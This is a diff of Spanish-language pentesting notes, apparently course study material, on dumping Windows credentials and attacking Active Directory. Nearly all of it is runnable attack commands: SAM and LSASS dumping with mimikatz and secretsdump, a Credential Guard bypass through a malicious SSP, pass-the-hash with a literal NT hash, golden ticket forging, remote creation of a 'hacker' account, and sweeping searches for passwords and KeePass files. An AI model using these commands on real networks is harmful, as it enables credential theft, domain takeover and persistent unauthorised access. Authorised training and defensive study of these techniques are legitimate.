@@ -2,28 +2,31 @@
 # Técnicas para Dumpear Credenciales
 
 ## 1. Dumpeando SAM
-Sirve principalmente para obtener credenciales de cuentas locales (sistemas no unidos a un AD). El valor que obtendremos aquí será el NT hash. Con el NT hash (o hash NTML) no importa si nos autenticamos utilizando el protocolo NTMLv1 ó NTMLv2. Si un usuario reutiliza esta contraseña en un AD, también se podrá hacer PtH en el AD.
+Sirve principalmente para obtener credenciales de cuentas locales (sistemas no unidos a un AD). El valor que obtendremos aquí será el NT hash. Con el NT hash (o hash NTML) no importa si nos autenticamos utilizando el protocolo NTMLv1 ó NTMLv2. Si un usuario reutiliza esta contraseña en un AD, también se podrá hacer PtH en el AD. Debemos ser usuarios privilegiados en el sistema para poder realizar este tipo de ataque
 ### Desde la máquina comprometida
 #### Guardar información con `reg.exe` - Máquina comprometida
 ```powershell
 reg.exe save hklm\sam C:\Users\public\sam.save
 reg.exe save hklm\system C:\Users\public\system.save
-reg.exe save hklm\security C:\Users\public\security.save
+reg.exe save hklm\security C:\Users\public\security.save # opcional
 ```
+- Con esta información debemos utilizar después `secretsdump` del siguiente modo: 
+	```bash
+	impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL > secretsdump.txt
+	```
 #### Coon mimikatz
 ```powershell
 .\mimikatz.exe privilege::debug lsadump::sam exit > dumpSAM
+# A veces hay que elevar privilegios con token::elevate antes de lsamdump::sam
 ```
-#### Utilizar `secretsdump.py` - pwnbox
-Con la información extraída, podemos 
-
+### Desde pwnbox
+#### Con `nxc`
 ```bash
-impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL > secretsdump.txt
+nxc smb $target -u <usuario> -p <contraseña> --sam
 ```
-
-### Con `nxc`
+#### Con impacket
 ```bash
-impacket
+impacket-secretsdump <user>:<pass>@$target
 ```
 
 ---
@@ -71,6 +74,21 @@ sekurlsa::logonpasswords
 # o volcando la información en un archivo
 .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit> output.txt
 ```
+### Mitigación credentialGuard - Obtención de credenciales en texto plano
+Cuando este está activado, no podemos recuperar los hashes de memoria. Solo está pensado para proteger a usuarios no locales
+- Comprobación de si está activado
+	```powershell
+	Get-ComputerInfo
+	```
+- El comando `misc::memssp` en Mimikatz instala un "Security Support Provider" (SSP) personalizado en memoria, lo que permite capturar credenciales en texto plano antes de que sean protegidas por Credential Guard. Esto solo tendrá efecto para los usuarios que se logueen a posteriori. Con acceso de administrador debemos ejecutar
+	```powershell
+	mimikatz.exe "privilege::debug" "misc::memssp" exit
+	```
+	Guardando la información de los usuarios que se logueen en:
+	```powershell
+	type C:\Windows\System32\mimilsa.log
+	```
+
 
 ---
 
@@ -154,13 +172,22 @@ evil-winrm -i $target -u Administrator -H <NTLM_hash>
 ```
 
 #### Con `impacket-psexec` - SMB
+Por la naturaleza de psexec se obtiene una shell con privilegios de `system`
 ```bash
 impacket-psexec administrator@$target -hashes :<NTLM_hash>
 ```
-
+#### Con `impacket-wmiexec` - SMB
+Se ejecuta una shell con privilegios del usuario que la lanza
+```bash
+impacket-wmiexec administrator@$target -hashes :<NTLM_hash>
+```
 #### Con `nxc`
 ```bash
 nxc smb $target -u Administrator -H <NTLM_hash> -x "whoami"
+```
+#### Con smbclient
+```bash
+smbclient \\\\$target\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 ```
 #### Con `xfreerdp`
 ```bash
@@ -340,12 +367,12 @@ Necesitamos pasar los siguientes parámetros:
 - **`/sid:S-1-5-21-XXXX`:** SID del dominio.
 - **`/krbtgt:<hash_krbtgt>`:** Hash NTLM de la cuenta `KRBTGT`.
 - **`/groups:512`:** Grupo al que pertenece el usuario (por ejemplo, `512` es el SID de **Domain Admins**).
-```cmd-session
-`kerberos::golden /user:Administrator /domain:dominio.local /sid:S-1-5-21-XXXX /krbtgt:<hash_krbtgt> /groups:512 /ticket:golden.kirbi`
+```powershell
+kerberos::golden /user:Administrator /domain:dominio.local /sid:S-1-5-21-XXXX /krbtgt:<hash_krbtgt> /groups:512 /ticket:golden.kirbi
 ```
 
 ### Inyección en memoria del golden Ticket
-```cmd-session
+```powershell
 mimikatz.exe kerberos::ptt golden.kirbi
 ```
 
@@ -362,13 +389,13 @@ mimikatz.exe kerberos::ptt golden.kirbi
 | **Interacción con el KDC** | Necesaria para generar nuevos tickets.                                | No necesaria si ya tienes el ticket.                     |
 ### Golden Ticket vs. OPtH
 
-| **Aspecto**             | **OverPass-the-Hash**                               | **Golden Ticket**                                                                  |
-| ----------------------- | --------------------------------------------------- | ---------------------------------------------------------------------------------- |
-| **Requisitos previos**  | Hash NTLM (`RC4_HMAC`) o claves Kerberos (`AES`).   | Hash de la cuenta **KRBTGT** del dominio.                                          |
-| **Uso principal**       | Generar un TGT válido para suplantar a un usuario.  | Crear un TGT falsificado con control total (podemos simular ser cualquier usuario) |
-| **Dependencia del KDC** | Necesitas interactuar con el KDC para generar TGTs. | No necesitas el KDC tras crear el ticket.                                          |
-| **Persistencia**        | Limitada: depende de la validez del hash/clave.     | Muy alta: el Golden Ticket no expira (salvo que cambie el hash de KRBTGT).         |
-| **Nivel de acceso**     | Limitado al usuario cuyo hash/clave posees.         | Control total del dominio con permisos personalizados.                             |
+| **Aspecto**             | **OverPass-the-Hash**                                 | **Golden Ticket**                                                                  |
+| ----------------------- | ----------------------------------------------------- | ---------------------------------------------------------------------------------- |
+| **Requisitos previos**  | Hash NTLM (`RC4_HMAC`) o claves Kerberos (`AES`).     | Hash de la cuenta **KRBTGT** del dominio.                                          |
+| **Uso principal**       | Generar un TGT válido para suplantar a un usuario.    | Crear un TGT falsificado con control total (podemos simular ser cualquier usuario) |
+| **Dependencia del KDC** | Necesitamos interactuar con el KDC para generar TGTs. | No necesitamos el KDC tras crear el ticket.                                        |
+| **Persistencia**        | Limitada: depende de la validez del hash/clave.       | Muy alta: el Golden Ticket no expira (salvo que cambie el hash de KRBTGT).         |
+| **Nivel de acceso**     | Limitado al usuario cuyo hash/clave posees.           | Control total del dominio con permisos personalizados.                             |
 ## Movimientos laterales
 Una vez utilizadas las técnicas de opth ó ptt, tendremos las credenciales inyectadas en memoria, por lo que tenemos varias alternativas para movernos lateralmente (en muchas ocasiones tendremos acceso a recursos que no teníamos antes de inyectar las credenciales)
 #### PowerShell Remoting (WinRM)
@@ -378,7 +405,7 @@ Enter-PSSession -ComputerName DC01
 ```
 #### WMI 
 Podríamos crear un proceso en el sistema remoto utilizando `process call create`:
-```
+```powershell
 wmic /node:"DC01" process call create "cmd.exe /c net user hacker Password123 /add"
 ```
 #### SMB
@@ -394,40 +421,125 @@ PsExec.exe \\DC01 -s cmd.exe
 ```
 xfreerdp /v:DC01
 ```
-# Otros Comandos Útiles
 
 ## Credential Hunting en Windows
 
 ### Buscar Credenciales en Archivos
-```cmd
+Findstr suele ser más rápido porque es nativo de Windows y está optimizado para
+```powershell
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 findstr /s /i cred n:\*.*
+# con más de una palabra a buscar
+findstr /SIM /C:"password" /C:"cred" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+# En todos los archivos
+findstr /S /I /M /C:"password" /C:"cred" C:\*.* # C:\*. para archivos sin extensión
 # powershell
 Get-ChildItem -Recurse -Path n:\ | Select-String "cred" -List
+# Buscando cualquier palabra que contenga cred o pass
+Get-ChildItem -Recurse -Path N:\ | Select-String -Pattern "cred|pass" -List
 ```
 ### Buscar archivos 
+- Buscar un archivo con un nombre completo
+	```powershell
+	# Powershell
+	Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue
+	# Mostrando ruta completa
+	Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
+	# Em cmd
+	dir C:\ /s /b | findstr "flag.txt" 2> $null
+	```
 - Que puedan contener credenciales
 	```cmd
 	dir n:\*cred* /s /b 
 	```
 - Que puedan contener archivos de configuración o similar
 	```powershell
-	#cmd
+	#cmd: /s de forma recursiva, /p resultados pausando por página
 	dir C:\*.config *.json *.yml *.ini *.conf *.env *.txt /s /p
 	#powershell
 	Get-ChildItem -Path C:\ -Recurse -Include *.config,*.json,*.yml,*.ini,*.conf,*.env,*.txt,*.cnf -ErrorAction SilentlyContinue
 	```
 - Mostrar todos los archivos que no están vacíos en un directorio (no muestra carpetas)
 	```bash
-	Get-ChildItem -Path C:\ -Recurse -Include *.config,*.json,*.yml,*.ini,*.conf,*.env,*.txt,*.cnf -ErrorAction SilentlyContinue
+	Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 }
 	```
+- Buscar archivos keepass (`*.kdbx`), gestor de contraseñas
+	```powershell
+	Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+	```
+- Opción propuesta por offsec para archivos con información sensible en una página web: 
+	```powershell
+	Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+	# por ejemplo, para buscar la palabra password o credentials dentro de estos archivos podríamos escribir
+	findstr /SIM /C:"password" /C:"credential" C:\xampp\*.txt
+	# podemos buscar la línea exacta en la que aparece una palabra
+	Select-String -Path "C:\xampp\passwords.txt" -Pattern "password"
+	# o más contenido alrededor de la palabra password
+	Select-String -Path "C:\xampp\passwords.txt" -Pattern "password" -Context 5,5
+	# Todos los ejemplos juntos en un oneliner
+	findstr /SIM /C:"password" /C:"credential" C:\xampp\*.txt | ForEach-Object { ($_ -replace '^([A-Z]:\\.*?):\d+', '$1') } | Where-Object { Test-Path $_ } | Select-Object -Unique | ForEach-Object { "=== Información en: $_ ===`n" + (Select-String -Path $_ -Pattern "password|credential" -Context 5,5 | Out-String) + "`n--------------------------------------------------`n" } | Out-File .\recolection.txt -Append
+	# otro ejemplo con get-childitem
+	Get-ChildItem -Recurse -Filter "*config*" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }  | ForEach-Object { "=== Información en: $_ ===`n" + (Select-String -Path $_ -Pattern "password|credential" -Context 5,5 | Out-String) + "`n--------------------------------------------------`n" }
+	```
+- Otros archivos interesantes (sacado de chuleta)
+```powershell
+# GPG keys
+dir /s /b /a C:\users\*.gpg
+# usually under C:\Users\*\AppData\Roaming\gnupg\
 
+# KeePass databases:
+dir *.kdb /a /b /s
+dir *.kdbx /a /b /s
+powershell -c "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
+
+# XAMPP config files:
+powershell -c "Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue"
+# my.ini is MySQL config
+# passwords.txt has default creds
+
+# User files
+powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
+```
 ### Con `LaZagne`
 ```cmd
 C:\tools> lazagne.exe all
 ```
-
-
-
----
-
+### Historial, logs y otros
+- Mostrar el historial de la sesión actual
+	```powershell
+	Get-History
+	```
+- Mostrar el historial de `PSReadLine` (módulo de autocompletado e historial de comandos persistente)
+	```powershell
+	# esto solo muestra dónde está guardado, después hay que abrir el archivo
+	(Get-PSReadlineOption).HistorySavePath
+	# puede ser interesante buscar sobre este archivo ConvertTo-SecureString, set-secret, keepass, -credential, authorization...
+	```
+- `Powershell transcription` es un es un mecanismo de auditoría que guarda todo lo que se ejecuta en PS en formato de texto.
+	```powershell
+	# Ubicación cuando está activado por GPO
+	C:\Users\<usuario>\Documents\PowerShell_transcript.<hostname>.txt
+	# Ubicación cuando está configurado globalemente
+	C:\Windows\System32\LogFiles\PowerShell
+	# Si lo activa un usuario manualmente, lo activa y desactiva con los siguientes comandos
+	Start-Transcript -Path C:\Logs\powershell_transcript.log -Append
+	Start-Transcript -Path C:\Users\Public\Transcripts\transcription01.txt -Append
+	Stop-Transcript
+	```
+- `Powershell Scritp Block Logging`: registra todos los scripts ejecutados en PS, incluyendo código dinámico como `IEX`, `DownloadString()`, etc.
+	- Ubicación de los logs desde RDP o similar
+		```
+		Event Viewer → Applications and Services Logs → Microsoft → Windows → PowerShell → Operational (Event ID 4104)
+		```
+	- Ubicación de los logs desde powershell
+		```powershell
+		# comprobar si está habilitado. Si lo está la salida será
+		Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging
+		# EnableScriptBlockLogging : 1 Si está habilitado
+		# Ver los scripts ejecutados (ID 4104: evento de Scritp Block Logging)
+		Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 }
+		# mostrar los scripts ejecutados: 
+		Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 } | Select-Object -ExpandProperty Message
+		# Exportar los logs
+		Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Out-File .\script_block_logs.txt
+		```
